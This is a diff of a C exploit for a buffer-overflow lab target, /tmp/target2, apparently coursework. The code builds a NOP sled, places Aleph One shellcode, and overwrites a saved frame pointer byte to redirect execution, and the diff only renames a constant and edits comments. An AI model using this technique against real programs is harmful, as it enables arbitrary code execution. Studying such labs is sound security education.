@@ -5,6 +5,7 @@
 #include "shellcode.h"
 
 #define TARGET "/tmp/target2"
+#define NOOP 0x90
 
 int main(void)
 {
@@ -13,13 +14,13 @@ int main(void)
   char buf[241];
 
   //Steps
-  //1. add noop sled to so that eip falls into noop
-  memset(buf, 0x90, 241);
+  //1. add noop sled to so that eip falls into noop for safe landing
+  memset(buf, NOOP, 241);
 
   //2. add shellcode from alephone
   strncpy(buf + 190, shellcode, 45);
 
-  //3. New EIP after modifying least significant byte of SFP. This is our landing address somewhere in buffer. 
+  //3. new EIP after modifying least significant byte of SFP. This is our landing address somewhere in buffer. 
   strncpy(buf + 236, "\x10", 1);
   strncpy(buf + 237, "\xfd", 1);
   strncpy(buf + 238, "\xff", 1);
